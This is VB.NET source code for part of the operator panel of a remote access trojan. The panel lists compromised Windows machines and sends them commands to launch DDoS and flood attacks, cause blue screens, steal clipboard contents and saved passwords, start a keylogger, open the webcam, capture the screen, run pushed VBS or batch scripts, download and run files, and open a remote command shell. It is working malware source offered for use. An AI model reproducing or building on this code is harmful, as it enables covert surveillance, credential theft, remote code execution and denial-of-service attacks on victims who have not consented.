Public Class gadget
    Dim x, y As Integer

    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick

        If Not y <= Screen.PrimaryScreen.WorkingArea.Height - Me.Height Then
            y -= 90
            Me.Location = New Point(x, y)
        Else
           
        End If

        Button1.PerformClick()
    End Sub
    
    Private Sub gadget_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        interbal.Text = 1
        x = Screen.PrimaryScreen.WorkingArea.Width - Me.Width
        y = Screen.PrimaryScreen.WorkingArea.Height
        Me.Location = New Point(x, y)
        Me.TopMost = True
        Timer1.Start()
    End Sub
    Sub armitage()





        l1.BackgroundImage = My.Resources.back1
        l1.SmallImageList = IMG
        l1.LargeImageList = IMG

        Dim i As Integer = 0
        For Each computer In Form1.l1.Items

            Dim hacked As String = computer.SubItems(3).Text
            If hacked.Contains("Windows 10") Or hacked.Contains("Windows 8.1") Then
                If hacked.Contains("Windows 10") Then
                    ' l1.Items(i).Text = "Windows 10"
                ElseIf hacked.Contains("Windows 8.1") Then
                    ' l1.Items(i).Text = "Windows 8.1"
                End If
                l1.Items(i).ImageIndex = 0
            ElseIf hacked.Contains("Windows 7") Or hacked.Contains("Windows Vista") Then
                If hacked.Contains("Windows 7") Then
                    ' l1.Items(i).Text = "Windows 7"
                ElseIf hacked.Contains("Vista") Then
                    ' l1.Items(i).Text = "Windows Vista"
                End If

                l1.Items(i).ImageIndex = 2
            ElseIf hacked.Contains("Windows XP") Or hacked.Contains("xp") Then
                ' l1.Items(i).Text = "Windows XP"
                l1.Items(i).ImageIndex = 1
            End If
            i += 1
        Next





    End Sub
    
   
    Private Sub BlackShadesNetButton8_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton8.Click

        Me.Hide()
    End Sub

    Sub armitagemini()


        l2.BackgroundImage = My.Resources.back1
        l2.SmallImageList = IMG
        l2.LargeImageList = IMG

        Dim i As Integer = 0
        For Each computer In Form1.ListView1.Items

            Dim hacked As String = computer.SubItems(3).Text
            If hacked.Contains("Windows 10") Or hacked.Contains("Windows 8.1") Then
                If hacked.Contains("Windows 10") Then
                    ' l1.Items(i).Text = "Windows 10"
                ElseIf hacked.Contains("Windows 8.1") Then
                    ' l1.Items(i).Text = "Windows 8.1"
                End If
                l2.Items(i).ImageIndex = 0
            ElseIf hacked.Contains("Windows 7") Or hacked.Contains("Windows Vista") Then
                If hacked.Contains("Windows 7") Then
                    ' l1.Items(i).Text = "Windows 7"
                ElseIf hacked.Contains("Vista") Then
                    ' l1.Items(i).Text = "Windows Vista"
                End If

                l2.Items(i).ImageIndex = 2
            ElseIf hacked.Contains("Windows XP") Or hacked.Contains("xp") Then
                ' l1.Items(i).Text = "Windows XP"
                l2.Items(i).ImageIndex = 1
            End If
            i += 1
        Next




    End Sub

    Private Sub refreshmain()
        ' l1.Items.Clear()


        For j = 0 To Form1.l1.Items.Count
            l1.Items.Add("")
            j += 1
        Next


        Dim i As Integer = 0
        For Each computer In Form1.l1.Items
            l1.Items(i).Text = Form1.l1.Items(i).Text
            l1.Items(i).ToolTipText = Form1.l1.Items(i).ToolTipText
            i += 1
        Next
        armitage()
    End Sub

    Private Sub refreshmini()

        For j = 0 To Form1.ListView1.Items.Count
            l2.Items.Add("")
            j += 1
        Next


        Dim i As Integer = 0
        For Each computer In Form1.ListView1.Items
            l2.Items(i).Text = Form1.ListView1.Items(i).Text
            l2.Items(i).ToolTipText = Form1.ListView1.Items(i).ToolTipText
            i += 1
        Next
        armitagemini()
    End Sub

 

    Private Sub l1_SelectedIndexChanged(sender As System.Object, e As System.EventArgs) Handles l1.SelectedIndexChanged
      
    End Sub

    Private Sub Timer2_Tick(sender As System.Object, e As System.EventArgs) Handles Timer2.Tick
        Try
            Timer1.Stop()
            l1.Items.Clear()

            refreshmain()
            l2.Items.Clear()
            refreshmini()
        Catch ex As Exception

        End Try

    End Sub

     Private Sub ToolStripMenuItem2_Click(sender As System.Object, e As System.EventArgs) Handles ToolStripMenuItem2.Click
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "stat")
        Next
        Button1.PerformClick()
    End Sub
    Private Sub OpenChatToolStripMenuItem1_Click(sender As System.Object, e As System.EventArgs) Handles OpenChatToolStripMenuItem1.Click
        'openchat
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "openchat")
        Next
        Button1.PerformClick()
    End Sub
    Private Sub StartToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartToolStripMenuItem.Click
        Dim name As String = InputBox("ProcessName", "Process Name")
        If name = "" Then

        Else
            For Each x As ListViewItem In l1.SelectedItems

                Form1.s.Send(x.ToolTipText, "newpr" & "||" & name)
            Next
        End If
        Button1.PerformClick()
    End Sub
    Private Sub ToolStripStatusLabel8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub
    Private Sub BlueScreenToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub
    Private Sub NormalToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NormalToolStripMenuItem.Click
        Dim str1 As String = Interaction.InputBox("IP / Web site :", "DDos Attacker", "", -1, -1)
        Dim str2 As String = Interaction.InputBox("Attack Speed", "8000 or 10000 or 12000 or 15000", "", -1, -1)
        Try
            For Each x As ListViewItem In l1.SelectedItems
                Form1.s.Send(x.ToolTipText, "ddos" & Form1.yy & str1 & Form1.yy & str2)
            Next
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
        Button1.PerformClick()
    End Sub
    Private Sub KillerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles KillerToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In l1.SelectedItems
                Form1.s.Send(x.ToolTipText, "FLOOD")
            Next
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
        Button1.PerformClick()
    End Sub

    Private Sub RegeditToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RegeditToolStripMenuItem.Click
        Try

            For Each x As ListViewItem In l1.SelectedItems
                Form1.s.Send(x.ToolTipText, "openRG" & "||")
            Next
        Catch : End Try
        Button1.PerformClick()
    End Sub

    Private Sub GetClipordToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GetClipordToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "clipss")
        Next
        Button1.PerformClick()
    End Sub

    Private Sub InstalledProgramToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles InstalledProgramToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "openfm2" & "||")
        Next
        Button1.PerformClick()
    End Sub

    Private Sub SpamToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "spam")
        Next
        Button1.PerformClick()
    End Sub

    Private Sub BlueScreenToolStripMenuItem_Click_1(ByVal sender As Object, ByVal e As EventArgs) Handles BlueScreenToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "bsod")
        Next
        Button1.PerformClick()
    End Sub

    Private Sub ToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem1.Click
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "openfm")
        Next
        Button1.PerformClick()
    End Sub
    Private Sub InformationToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InformationToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            Timer1.Start()
            Form1.s.Send(x.ToolTipText, "sendinformation")
        Next
        Button1.PerformClick()
    End Sub


    Private Sub VbsToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles VbsToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            If Script.ShowDialog = DialogResult.OK Then
                Form1.s.Send(Form1.sock, "Vbs" & "||" & Script.scriptText.Replace(vbNewLine, "||"))
            End If
        Next
        Button1.PerformClick()
    End Sub

    Private Sub BatToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BatToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            If Script.ShowDialog = DialogResult.OK Then
                Form1.s.Send(Form1.sock, "Batch" & "||" & Script.scriptText.Replace(vbNewLine, "||"))
            End If
        Next
        Button1.PerformClick()
    End Sub

    Private Sub REGToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles REGToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "requestrecords")
        Next
        Button1.PerformClick()
    End Sub
    Private Sub CmdToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CmdToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "rss" & "||")
        Next
        Button1.PerformClick()
    End Sub
    Private Sub اللعبToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles اللعبToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "fun")
        Next
        Button1.PerformClick()
    End Sub

    Private Sub FromLinkToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FromLinkToolStripMenuItem.Click
        Dim a As String = InputBox("Enter Direct URL", "Download")
        Dim aa As String = InputBox("Enter the name of the file", "Download")
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "download" & "||" & a & "||" & aa)
        Next
        Button1.PerformClick()
    End Sub

    Private Sub FromDiskToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FromDiskToolStripMenuItem.Click
        Dim o As New OpenFileDialog
        o.ShowDialog()
        Dim n As New IO.FileInfo(o.FileName)
        If o.FileName.Length > 0 Then
            For Each x As ListViewItem In l1.SelectedItems
                Form1.s.Send(x.ToolTipText, "sendfile" & "||" & n.Name & "||" & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
            Next
        End If
        Button1.PerformClick()
    End Sub

    Private Sub DToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DToolStripMenuItem.Click
        Dim c As String = InputBox("Enter Website")
        For Each x As ListViewItem In l1.SelectedItems
            x.Text = c
            Form1.s.Send(x.ToolTipText, "openurl" & "||" & "Default" & "||" & c)
        Next
        Button1.PerformClick()
    End Sub

    Private Sub GoogleChromeToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GoogleChromeToolStripMenuItem.Click
        Dim c As String = InputBox("Enter Website")
        For Each x As ListViewItem In l1.SelectedItems
            x.Text = c
            Form1.s.Send(x.ToolTipText, "openurl" & "||" & "Chrome" & "||" & c)
        Next
        Button1.PerformClick()
    End Sub

    Private Sub MozilaFireFoxToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MozilaFireFoxToolStripMenuItem.Click
        Dim c As String = InputBox("Enter Website")
        For Each x As ListViewItem In l1.SelectedItems
            x.Text = c
            Form1.s.Send(x.ToolTipText, "openurl" & "||" & "firefox" & "||" & c)
        Next
        Button1.PerformClick()
    End Sub

    Private Sub OperaToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OperaToolStripMenuItem.Click
        Dim c As String = InputBox("Enter Website")
        For Each x As ListViewItem In l1.SelectedItems
            x.Text = c
            Form1.s.Send(x.ToolTipText, "openurl" & "||" & "Opera" & "||" & c)
        Next
        Button1.PerformClick()
    End Sub

    Private Sub SafariToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SafariToolStripMenuItem.Click
        Dim c As String = InputBox("Enter Website")
        For Each x As ListViewItem In l1.SelectedItems
            x.Text = c
            Form1.s.Send(x.ToolTipText, "openurl" & "||" & "Safari" & "||" & c)
        Next
        Button1.PerformClick()
    End Sub

    Private Sub InternetExplolerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InternetExplolerToolStripMenuItem.Click
        Dim c As String = InputBox("Enter Website")
        For Each x As ListViewItem In l1.SelectedItems
            x.Text = c
            Form1.s.Send(x.ToolTipText, "openurl" & "||" & "iexplore" & "||" & c)
        Next
        Button1.PerformClick()
    End Sub

    Private Sub RenameToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RenameToolStripMenuItem.Click
        Dim b As String = InputBox("Enter New Name : ")
        For Each x As ListViewItem In l1.SelectedItems
            x.Text = b
            Form1.s.Send(x.ToolTipText, "rename" & "||" & b)
        Next
        Button1.PerformClick()
    End Sub

    Private Sub RestartToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RestartToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "restart")
        Next
        Button1.PerformClick()
    End Sub
    Private Sub FileManagerToolStripMenuItem_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs)
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "openfm")
        Next
        Button1.PerformClick()
    End Sub

    Private Sub MenuStrip1_ItemClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.ToolStripItemClickedEventArgs)

    End Sub

    Private Sub ScreenCapterToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ScreenCapterToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "!")
        Next
        Button1.PerformClick()
    End Sub

    Private Sub FfffffffToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "opencam")
        Next
        Button1.PerformClick()
    End Sub

    Private Sub CamToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CamToolStripMenuItem.Click
        ' For Each x As ListViewItem In l1.SelectedItems
        ' Form1.s.Send(x.ToolTipText, "camlist")
        ' Next
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "camlist")
        Next
        Button1.PerformClick()
    End Sub


    Private Sub KlToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles KlToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "openkl")
        Next
        Button1.PerformClick()
    End Sub



    Private Sub الباسورداتToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles الباسورداتToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "openpw")
        Next
        Button1.PerformClick()
    End Sub
    Private Sub ProcToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ProcToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "\\")
        Next
        Button1.PerformClick()
    End Sub

    Private Sub FunToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "fun")
        Next
        Button1.PerformClick()
    End Sub

    Private Sub TeToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TeToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "opentto")
        Next
        Button1.PerformClick()
    End Sub
    Private Sub UninstallToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UninstallToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "Uninstall")
        Next
        Button1.PerformClick()
    End Sub

    Private Sub ViewWiFiNetworksToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ViewWiFiNetworksToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "viewwifi")
        Next
        Button1.PerformClick()
    End Sub

    Private Sub ViewLanPCsToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ViewLanPCsToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "viewlan")
        Next
        Button1.PerformClick()
    End Sub
    Private Sub GetDevicesAndPrintersToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles GetDevicesAndPrintersToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "devicesinfo")
        Next
        Button1.PerformClick()
    End Sub

    Private Sub ScanWebSiteFromVictimPCToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ScanWebSiteFromVictimPCToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "sitescanner")
        Next
        Button1.PerformClick()
    End Sub
    Private Sub ToolStripMenuItem3_Click(sender As System.Object, e As System.EventArgs)
        Dim mapip As String
        For Each x As ListViewItem In l1.SelectedItems
            mapip = (x.SubItems(1).Text)

            If mapip.Contains("127.0") = True Or mapip.Contains("192.168") Then

                Dim f As map = My.Application.OpenForms("map" & mapip)
                If f Is Nothing Then
                    If Me.InvokeRequired Then

                        Exit Sub
                    End If
                    f = New map
                    f.Name &= mapip
                    f.BlackShadesNetForm1.Text &= " " & mapip
                    f.Show()
                    mapip = ""
                    f.ListBox1.Items.Add("Loading you Computer Information")
                    f.getinfo(mapip)

                End If
            Else
                Dim f As map = My.Application.OpenForms("map" & mapip)
                If f Is Nothing Then
                    If Me.InvokeRequired Then

                        Exit Sub
                    End If
                    f = New map
                    f.Name &= mapip
                    f.BlackShadesNetForm1.Text &= " " & mapip
                    f.Show()
                    f.getinfo(mapip)
                End If
            End If

        Next
    End Sub

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        Dim inter As Integer = Integer.Parse(interbal.Text)
        '    Timer2.Stop()
        Timer2.Interval = inter * 1000
        Timer2.Start()
    End Sub

    Private Sub RunFileFromDeskToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RunFileFromDeskToolStripMenuItem.Click
        Dim o As New OpenFileDialog
        o.ShowDialog()
        Dim n As New IO.FileInfo(o.FileName)
        If o.FileName.Length > 0 Then
            For Each x As ListViewItem In l2.SelectedItems
                Form1.ss.Send(x.ToolTipText, "sendfile" & "||" & n.Name & "||" & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
            Next
        End If
        Button1.PerformClick()
    End Sub

    Private Sub UninstallVictimToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles UninstallVictimToolStripMenuItem.Click
        For Each x As ListViewItem In l2.SelectedItems
            Form1.ss.Send(x.ToolTipText, "Uninstall")
        Next
        Button1.PerformClick()
    End Sub

    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        Timer2.Stop()
    End Sub

    Private Sub ContextMenuStrip1_Closed(sender As Object, e As System.Windows.Forms.ToolStripDropDownClosedEventArgs) Handles ContextMenuStrip1.Closed
        Button1.PerformClick()
    End Sub

    Private Sub ContextMenuStrip1_Opening(sender As System.Object, e As System.ComponentModel.CancelEventArgs) Handles ContextMenuStrip1.Opening
        Timer2.Stop()
    End Sub

    Private Sub ContextMenuStrip3_Closed(sender As Object, e As System.Windows.Forms.ToolStripDropDownClosedEventArgs) Handles ContextMenuStrip3.Closed
        Button1.PerformClick()
    End Sub

    Private Sub ContextMenuStrip3_Opening(sender As System.Object, e As System.ComponentModel.CancelEventArgs) Handles ContextMenuStrip3.Opening
        Timer2.Stop()
    End Sub
End Class